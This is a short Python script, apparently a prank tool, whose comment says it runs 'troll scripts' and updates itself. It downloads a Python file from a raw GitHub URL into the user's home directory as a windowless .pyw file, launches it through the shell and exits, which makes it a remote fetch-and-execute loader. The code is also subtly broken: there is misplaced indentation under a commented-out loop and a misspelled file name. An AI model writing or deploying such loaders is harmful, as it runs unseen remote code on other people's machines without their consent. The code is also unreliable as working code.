# Runs the troll scripts and updates its-self

def main():
    import os, urllib.request, pathlib, time
    def sleep(Time):
        time.sleep(Time)
    #while 1 == 1:
        
        def update():
            home = os.path.expanduser("~")
            os.chdir(home)
            dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
            path = str(home) + '\update.pyw'
            try:
                os.remove('updae.pyw')
            except FileNotFoundError:
                print('Its Not Here')
            urllib.request.urlretrieve(dlurl, '{}'.format(path))
            os.system("start cmd /c {}".format('py ' + path))
            exit()
        update()
        sleep(10)
